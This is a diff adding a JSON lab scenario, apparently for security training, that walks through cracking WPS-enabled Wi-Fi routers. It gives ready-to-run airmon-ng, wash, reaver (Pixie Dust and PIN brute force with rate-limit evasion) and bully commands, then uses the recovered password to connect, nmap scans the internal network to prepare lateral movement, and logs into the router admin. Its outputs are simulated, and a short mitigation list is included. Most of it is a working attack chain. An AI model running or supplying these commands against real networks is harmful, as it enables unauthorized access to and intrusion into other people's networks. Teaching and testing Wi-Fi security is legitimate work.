@@ -1,0 +1,146 @@
+{
+  "title": "WPS Attack and Network Compromise",
+  "description": "Exploiting WPS vulnerabilities for instant password recovery via Pixie Dust and PIN brute force",
+  "difficulty": "beginner",
+  "estimated_time": "45 minutes",
+  "tools_used": [
+    "wash",
+    "reaver",
+    "pixiewps",
+    "bully"
+  ],
+  "attack_chain": [
+    {
+      "step": 1,
+      "title": "Monitor Mode Activation",
+      "command": "airmon-ng start wlan0",
+      "explanation": "Enable monitor mode to scan for WPS-enabled networks",
+      "expected_output": "wlan0mon created, monitor mode active for WPS scanning",
+      "success_criteria": "Monitor interface ready"
+    },
+    {
+      "step": 2,
+      "title": "WPS Network Discovery",
+      "command": "wash -i wlan0mon",
+      "explanation": "Scan for WiFi networks with WPS enabled and identify vulnerability status",
+      "expected_output": "4 WPS-enabled networks found: GuestNet (unlocked, WPS 1.0), OfficeMain (unlocked, WPS 2.0)",
+      "success_criteria": "Unlocked WPS networks identified"
+    },
+    {
+      "step": 3,
+      "title": "Target Selection",
+      "command": "airodump-ng -c 1 --bssid 99:88:77:66:55:44 wlan0mon",
+      "explanation": "Focus on GuestNet with strong signal and WPS 1.0 (likely Pixie Dust vulnerable)",
+      "expected_output": "GuestNet: channel 1, -73 dBm, TP-Link router, 2 clients connected",
+      "success_criteria": "Target locked for attack"
+    },
+    {
+      "step": 4,
+      "title": "Pixie Dust Attack Attempt",
+      "command": "reaver -i wlan0mon -b 99:88:77:66:55:44 -c 1 -vv -K 1",
+      "explanation": "Attempt Pixie Dust attack to instantly recover WPS PIN without brute force",
+      "expected_output": "Pixie Dust successful! WPS PIN: 83014554, WPA PSK: GuestPass123 (30 seconds)",
+      "success_criteria": "PIN and password recovered"
+    },
+    {
+      "step": 5,
+      "title": "Verify Network Access",
+      "command": "nmcli dev wifi connect GuestNet password GuestPass123",
+      "explanation": "Connect to network using recovered password to verify success",
+      "expected_output": "Successfully connected to GuestNet with recovered password",
+      "success_criteria": "Network connection established"
+    },
+    {
+      "step": 6,
+      "title": "Fallback to PIN Brute Force",
+      "command": "reaver -i wlan0mon -b DD:EE:FF:00:11:22 -c 6 -vv -L -N",
+      "explanation": "Attack second target (OfficeMain) using traditional WPS PIN brute force",
+      "expected_output": "PIN brute force in progress, rate limiting detected, ETA 3-4 hours",
+      "success_criteria": "Brute force attack running"
+    },
+    {
+      "step": 7,
+      "title": "Optimize Brute Force Settings",
+      "command": "reaver -i wlan0mon -b DD:EE:FF:00:11:22 -c 6 -vv -d 15 -T 0.5 -r 3:15",
+      "explanation": "Adjust timing to work around AP rate limiting for more reliable attack",
+      "expected_output": "Improved timing: 15s delay between attempts, better success rate",
+      "success_criteria": "Attack proceeds despite rate limits"
+    },
+    {
+      "step": 8,
+      "title": "Alternative Tool - Bully",
+      "command": "bully -b DD:EE:FF:00:11:22 -c 6 wlan0mon -v 3",
+      "explanation": "Switch to Bully for better stability when Reaver encounters issues",
+      "expected_output": "Bully attack running with detailed progress, handling rate limits better",
+      "success_criteria": "Stable attack progress"
+    },
+    {
+      "step": 9,
+      "title": "Session Resume Capability",
+      "command": "reaver -i wlan0mon -b DD:EE:FF:00:11:22 -c 6 -vv -s /tmp/reaver.session",
+      "explanation": "Save attack progress to resume later if interrupted",
+      "expected_output": "Session saved, can resume from PIN 3,547/11,000 if disconnected",
+      "success_criteria": "Progress saved for resume"
+    },
+    {
+      "step": 10,
+      "title": "Successful PIN Recovery",
+      "command": "[After 3 hours 47 minutes]",
+      "explanation": "WPS PIN successfully brute-forced through all possible combinations",
+      "expected_output": "WPS PIN: 52837648, WPA PSK: office2024! recovered",
+      "success_criteria": "Full network credentials obtained"
+    },
+    {
+      "step": 11,
+      "title": "Network Reconnaissance",
+      "command": "nmap -sn 192.168.10.0/24",
+      "explanation": "Scan network after connecting to discover internal hosts and services",
+      "expected_output": "15 hosts discovered including servers, printers, IoT devices",
+      "success_criteria": "Network topology mapped"
+    },
+    {
+      "step": 12,
+      "title": "Lateral Movement Preparation",
+      "command": "nmap -sV -p 22,80,443,445,3389 192.168.10.0/24",
+      "explanation": "Service scan to identify exploitation targets on internal network",
+      "expected_output": "File server (SMB 445), web server (HTTP 80), Windows desktops (RDP 3389)",
+      "success_criteria": "Attack targets identified"
+    },
+    {
+      "step": 13,
+      "title": "Disable WPS on Router",
+      "command": "curl -u admin:office2024! http://192.168.10.1/api/wps -X POST -d 'enabled=false'",
+      "explanation": "Access router admin panel and disable WPS to prevent future attacks (remediation demo)",
+      "expected_output": "WPS disabled on router configuration, vulnerability eliminated",
+      "success_criteria": "WPS turned off"
+    }
+  ],
+  "learning_objectives": [
+    "WPS vulnerability assessment using wash and airodump-ng",
+    "Pixie Dust attack for instant PIN recovery on vulnerable routers",
+    "WPS PIN brute force methodology and optimization",
+    "Handling AP rate limiting with timing adjustments",
+    "Session management for long-running attacks",
+    "Alternative tools (Reaver vs Bully) for different scenarios",
+    "Post-compromise network reconnaissance",
+    "Router configuration access for remediation"
+  ],
+  "mitigation": [
+    "Disable WPS entirely (most secure option)",
+    "If WPS needed, use WPS 2.0 with lockout after failed attempts",
+    "Update router firmware to patch Pixie Dust vulnerability",
+    "Enable WPS lockout/rate limiting features",
+    "Use strong WPA2/WPA3 password regardless of WPS status",
+    "Monitor for unusual authentication attempts",
+    "Replace routers known to be Pixie Dust vulnerable",
+    "Use network segmentation to limit damage from WiFi compromise"
+  ],
+  "tags": [
+    "wps",
+    "pixie_dust",
+    "reaver",
+    "bully",
+    "pin_brute_force",
+    "wifi_cracking"
+  ]
+}
